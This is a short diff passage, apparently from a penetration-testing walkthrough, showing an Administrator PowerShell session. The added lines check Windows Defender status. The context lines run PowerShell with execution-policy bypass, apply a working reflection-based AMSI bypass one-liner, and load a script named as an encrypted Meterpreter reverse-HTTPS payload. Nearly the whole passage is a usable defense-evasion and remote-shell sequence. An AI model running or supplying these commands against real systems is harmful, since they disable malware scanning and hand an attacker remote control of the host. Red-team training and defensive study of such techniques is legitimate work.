@@ -228,6 +228,18 @@ C:\Users\Administrator> powershell -exec bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 
+PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled
+
+AntivirusEnabled
+----------------
+            True
+
+PS C:\Users\Administrator> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
 PS C:\Users\Administrator> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 PS C:\Users\Administrator> 
 PS C:\Users\Administrator> . .\Invoke-meterpreter-x64-reverse-https-encrypted.ps1
